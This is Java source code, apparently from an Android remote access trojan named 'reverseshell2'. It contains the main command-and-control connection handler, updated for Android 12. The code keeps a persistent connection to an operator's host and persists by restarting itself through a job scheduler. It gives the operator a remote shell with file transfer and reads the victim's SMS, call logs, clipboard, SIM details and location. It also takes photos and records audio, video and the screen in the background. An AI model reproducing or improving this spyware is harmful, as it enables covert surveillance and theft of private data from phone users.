package com.example.reverseshell2;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.example.reverseshell2.Payloads.CameraService;
import com.example.reverseshell2.Payloads.ScreenRecordActivity;
import com.example.reverseshell2.Payloads.audioManager;
import com.example.reverseshell2.Payloads.ipAddr;
import com.example.reverseshell2.Payloads.locationManager;
import com.example.reverseshell2.Payloads.newShell;
import com.example.reverseshell2.Payloads.readCallLogs;
import com.example.reverseshell2.Payloads.readSMS;
import com.example.reverseshell2.Payloads.screenRecorder;
import com.example.reverseshell2.Payloads.vibrate;
import com.example.reverseshell2.Payloads.videoRecorder;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;

/**
 * Main C2 connection handler, updated for Android 12 (API 31).
 *
 * Android 12 changes made in this file:
 *
 *  1. CAMERA ("takepic \d") - On Android 11+ a foregroundServiceType="camera"
 *     was introduced, and on Android 12 the camera CANNOT be opened while the
 *     app is in the background unless the app is running a foreground service
 *     declared with android:foregroundServiceType="camera". The old code called
 *     CameraPreview.startUp() directly from the socket thread, which is
 *     considered "background" on Android 12 and would throw a SecurityException.
 *     The command now routes through {@link CameraService} (a foreground
 *     service), which is the Android 12-safe way to take a picture in the
 *     background. The service stops itself automatically after the photo is
 *     sent (or after a 30 second timeout).
 *
 *  2. RECONNECT LOOP - The old code spawned a NEW tcpConnection AsyncTask
 *     inside the while(true) loop on every SocketException, creating unbounded
 *     duplicate tasks (battery drain, network flood, stale references to a
 *     finished Activity). This version uses a SINGLE persistent connection loop
 *     with a fixed retry delay (RETRY_DELAY_MS). When the connection is lost,
 *     it schedules a reconnect via functions.jobScheduler() instead of starting
 *     a raw background service.
 *
 *  3. SERVICE RESTART - On Android 12, calling startService() from the
 *     background throws IllegalStateException ("Background service start not
 *     allowed"). On Lollipop+ we now use functions.jobScheduler(), which is
 *     ALLOWED on Android 12 (JobScheduler is exempt from the background-start
 *     restriction). Plain startService() is only used on pre-Lollipop devices
 *     where the restriction does not exist.
 *
 *  4. SCREEN RECORDING - Added "screenrecord" and "stopScreenRecord" commands
 *     wired to the Android 12 MediaProjection consent flow
 *     ({@link ScreenRecordActivity}) and the {@link screenRecorder} foreground
 *     service. On Android 12 a fresh user consent is required for EVERY
 *     recording session (system limitation - cannot be bypassed).
 *
 *  5. HELP - The old "help" command just echoed "help". It now lists every
 *     supported command.
 *
 * All other commands (shell, clipboard, SMS, location, audio, video, call logs,
 * SIM, IP, MAC, vibrate, deviceInfo) are unchanged in behavior.
 */
public class tcpConnection extends AsyncTask<String, Void, Void> {

    /** Delay between reconnect attempts (ms). */
    private static final long RETRY_DELAY_MS = 5000L;

    Activity activity;
    functions functions;
    Context context;

    newShell shell;

    ipAddr ipAddr = new ipAddr();
    vibrate vibrate;
    readSMS readSMS;
    locationManager locationManager;
    audioManager audioManager;
    videoRecorder videoRecorder;
    readCallLogs readCallLogs;

    /** Static output stream used by the payload foreground services. */
    public static OutputStream out;

    static String TAG = "tcpConnectionClass";

    public tcpConnection(Activity activity, Context context) {
        this.activity = activity;
        this.context = context;
        functions = new functions(activity);
        vibrate = new vibrate(context);
        readSMS = new readSMS(context);
        locationManager = new locationManager(context, activity);
        audioManager = new audioManager();
        videoRecorder = new videoRecorder();
        readCallLogs = new readCallLogs(context, activity);
        shell = new newShell(activity, context);
    }

    @Override
    protected Void doInBackground(String... strings) {
        Socket socket = null;

        // Android 12: keep ONE persistent connection loop. On disconnect, wait
        // RETRY_DELAY_MS and reconnect. No recursive AsyncTask spawning - the
        // old code created a new tcpConnection on every SocketException, which
        // produced unbounded duplicate connections.
        while (true) {
            try {
                Log.d(TAG, "trying");
                socket = new Socket();
                try {
                    socket.connect(new InetSocketAddress(strings[0], Integer.parseInt(strings[1])), 3000);
                } catch (SocketTimeoutException | SocketException e) {
                    Log.d(TAG, "connect failed, retrying in " + RETRY_DELAY_MS + "ms");
                    safeClose(socket);
                    scheduleReconnect();
                    try {
                        Thread.sleep(RETRY_DELAY_MS);
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        return null;
                    }
                    continue;
                }

                if (!socket.isConnected()) {
                    safeClose(socket);
                    scheduleReconnect();
                    try {
                        Thread.sleep(RETRY_DELAY_MS);
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        return null;
                    }
                    continue;
                }

                Log.d(TAG, "done");
                out = new DataOutputStream(socket.getOutputStream());
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                String model = android.os.Build.MODEL + "\n";
                String welcomeMess = "Hello there, welcome to reverse shell of " + model;
                out.write(welcomeMess.getBytes("UTF-8"));

                String line;
                while ((line = in.readLine()) != null) {
                    Log.d(TAG, line);

                    if (line.equals("exit")) {
                        Log.d("service_runner", "called");
                        scheduleReconnect();
                        break; // exit the read loop, then reconnect
                    } else if (line.equals("camList")) {
                        String list = functions.get_numberOfCameras();
                        out.write(list.getBytes("UTF-8"));
                    } else if (line.matches("takepic \\d")) {
                        final String[] cameraid = line.split(" ");
                        try {
                            out.write("IMAGE\n".getBytes("UTF-8"));
                            // Android 12: open the camera through the camera
                            // foreground service, NOT directly. CameraService
                            // calls startForeground() with
                            // FOREGROUND_SERVICE_TYPE_CAMERA, which is required
                            // for background camera access on Android 12.
                            CameraService.start(context, Integer.parseInt(cameraid[1]), out);
                        } catch (Exception e) {
                            e.printStackTrace();
                            new jumper(context).init();
                            Log.d("done", "done");
                        }
                    } else if (line.equals("shell")) {
                        out.write("SHELL".getBytes("UTF-8"));
                        shell.executeShell(socket, out);
                    } else if (line.equals("getClipData")) {
                        String clipboard_data = functions.readFromClipboard();
                        if (clipboard_data != null) {
                            clipboard_data = clipboard_data + "\n";
                            out.write(clipboard_data.getBytes("UTF-8"));
                        } else {
                            out.write("No Clipboard Data Present\n".getBytes("UTF-8"));
                        }
                    } else if (line.equals("deviceInfo")) {
                        out.write(functions.deviceInfo().getBytes());
                    } else if (line.equals("help")) {
                        out.write(getHelpText().getBytes("UTF-8"));
                    } else if (line.equals("clear")) {
                        out.write("Hello there, welcome to reverse shell \n".getBytes("UTF-8"));
                    } else if (line.equals("getSimDetails")) {
                        String number = functions.getPhoneNumber(context);
                        number += "\n";
                        out.write(number.getBytes("UTF-8"));
                    } else if (line.equals("getIP")) {
                        String ip_addr = "Device Ip: " + ipAddr.getIPAddress(true) + "\n";
                        out.write(ip_addr.getBytes("UTF-8"));
                    } else if (line.matches("vibrate \\d")) {
                        final String[] numbers = line.split(" ");
                        vibrate.vib(Integer.parseInt(numbers[1]));
                        String res = "Vibrating " + numbers[1] + " time successful.\n";
                        out.write(res.getBytes("UTF-8"));
                    } else if (line.contains("getSMS ")) {
                        String[] box = line.split(" ");
                        if (box[1].equals("inbox")) {
                            out.write("readSMS inbox\n".getBytes("UTF-8"));
                            String sms = readSMS.readSMSBox("inbox");
                            out.write(sms.getBytes("UTF-8"));
                        } else if (box[1].equals("sent")) {
                            out.write("readSMS sent\n".getBytes("UTF-8"));
                            String sms = readSMS.readSMSBox("sent");
                            out.write(sms.getBytes("UTF-8"));
                        } else {
                            out.write("readSMS null\n".getBytes("UTF-8"));
                            out.write("Wrong Command\n".getBytes("UTF-8"));
                        }
                        out.write("END123\n".getBytes("UTF-8"));
                    } else if (line.equals("getLocation")) {
                        out.write("getLocation\n".getBytes("UTF-8"));
                        String res = locationManager.getLocation();
                        out.write(res.getBytes("UTF-8"));
                        out.write("\n".getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    } else if (line.equals("startAudio")) {
                        Intent serviceIntent = new Intent(context, com.example.reverseshell2.Payloads.audioManager.class);
                        serviceIntent.putExtra("ins", "startFore");
                        // Android 8+/12: startForegroundService is required; the
                        // audioManager service calls startForeground() with the
                        // microphone FGS type within 5 seconds.
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            ContextCompat.startForegroundService(context, serviceIntent);
                        } else {
                            context.startService(serviceIntent);
                        }
                    } else if (line.equals("stopAudio")) {
                        Intent serviceIntent = new Intent(context, com.example.reverseshell2.Payloads.audioManager.class);
                        serviceIntent.putExtra("ins", "stopFore");
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            ContextCompat.startForegroundService(context, serviceIntent);
                        } else {
                            context.startService(serviceIntent);
                        }
                    } else if (line.matches("startVideo \\d")) {
                        final String[] cameraid = line.split(" ");
                        Intent serviceIntent = new Intent(context, videoRecorder.class);
                        serviceIntent.putExtra("ins", "startFore");
                        serviceIntent.putExtra("cameraid", cameraid[1]);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            ContextCompat.startForegroundService(context, serviceIntent);
                        } else {
                            context.startService(serviceIntent);
                        }
                    } else if (line.equals("stopVideo")) {
                        Intent serviceIntent = new Intent(context, videoRecorder.class);
                        serviceIntent.putExtra("ins", "stopFore");
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            ContextCompat.startForegroundService(context, serviceIntent);
                        } else {
                            context.startService(serviceIntent);
                        }
                    } else if (line.equals("screenrecord")) {
                        // Android 12: screen recording REQUIRES a fresh user
                        // consent via the MediaProjection dialog. Start the
                        // transparent ScreenRecordActivity which shows the
                        // system dialog and then starts screenRecorder.
                        try {
                            Intent scr = new Intent(context, ScreenRecordActivity.class);
                            scr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            context.startActivity(scr);
                        } catch (Exception e) {
                            Log.e(TAG, "Failed to start ScreenRecordActivity", e);
                            out.write("Screen Recording Not Supported\n".getBytes("UTF-8"));
                        }
                    } else if (line.equals("stopScreenRecord")) {
                        Intent serviceIntent = new Intent(context, screenRecorder.class);
                        serviceIntent.putExtra("ins", "stopFore");
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            ContextCompat.startForegroundService(context, serviceIntent);
                        } else {
                            context.startService(serviceIntent);
                        }
                    } else if (line.equals("getCallLogs")) {
                        out.write("callLogs\n".getBytes("UTF-8"));
                        String call_logs = readCallLogs.readLogs();
                        if (call_logs == null) {
                            out.write("No call logs found on the device\n".getBytes("UTF-8"));
                            out.write("END123\n".getBytes("UTF-8"));
                        } else {
                            out.write(call_logs.getBytes("UTF-8"));
                            out.write("END123\n".getBytes("UTF-8"));
                        }
                    } else if (line.equals("getMACAddress")) {
                        String macAddress = ipAddr.getMACAddress(null);
                        macAddress += "\n";
                        out.write(macAddress.getBytes("UTF-8"));
                    } else {
                        out.write("Unknown Command \n".getBytes("UTF-8"));
                    }
                }

                // Read loop ended (disconnect or "exit"). Fall through to the
                // reconnect logic below so the single persistent connection
                // loop keeps trying to reconnect.
                Log.d(TAG, "Read loop ended, reconnecting");

            } catch (Exception e) {
                Log.d("service_runner", "called");
                e.printStackTrace();
            } finally {
                safeClose(socket);
                socket = null;
            }

            // Android 12: never call startService() from the background here.
            // Schedule a job instead - JobScheduler is allowed on Android 12.
            scheduleReconnect();

            try {
                Thread.sleep(RETRY_DELAY_MS);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                return null;
            }
        }
        return null;
    }

    /**
     * Android 12-safe reconnect helper.
     *
     * On Lollipop+ we schedule a JobScheduler job (exempt from the
     * background-start restriction on Android 12). The job restarts mainService
     * via jumper.init(), which re-establishes the connection. Plain
     * startService() is only used on pre-Lollipop devices where the background
     * service-start restriction does not exist.
     */
    private void scheduleReconnect() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                functions.jobScheduler(context);
            } else {
                if (activity != null) {
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                context.startService(new Intent(context, mainService.class));
                            } catch (Exception e) {
                                Log.e(TAG, "startService failed (pre-Lollipop)", e);
                            }
                        }
                    });
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "scheduleReconnect failed", e);
        }
    }

    /** Closes a socket without throwing. */
    private void safeClose(Socket socket) {
        if (socket != null) {
            try {
                socket.close();
            } catch (Exception ignored) {
            }
        }
    }

    /** Returns the full help text listing every supported command. */
    private String getHelpText() {
        return "Available Commands:\n"
                + "------------------------------------------------\n"
                + "help                       - show this help\n"
                + "clear                      - clear the banner\n"
                + "exit                       - disconnect and reconnect\n"
                + "shell                      - interactive shell\n"
                + "  inside shell: putFile <name> <ext> <b64>  - upload file\n"
                + "  inside shell: get <path>                  - download file\n"
                + "deviceInfo                 - device information\n"
                + "getIP                      - device IP address\n"
                + "getMACAddress              - device MAC address (UNAVAILABLE on Android 10+)\n"
                + "getSimDetails              - SIM / phone details\n"
                + "getClipData                - clipboard content\n"
                + "getSMS inbox               - read inbox SMS\n"
                + "getSMS sent                - read sent SMS\n"
                + "getCallLogs                - read call logs\n"
                + "getLocation                - get device location\n"
                + "camList                    - list cameras\n"
                + "takepic 0|1                - take a picture (0=back, 1=front)\n"
                + "startVideo 0|1             - start video recording\n"
                + "stopVideo                  - stop video recording and send\n"
                + "screenrecord               - start screen recording (requires consent dialog)\n"
                + "stopScreenRecord           - stop screen recording and send\n"
                + "startAudio                 - start audio recording\n"
                + "stopAudio                  - stop audio recording and send\n"
                + "vibrate <n>                - vibrate n times\n"
                + "------------------------------------------------\n";
    }
}

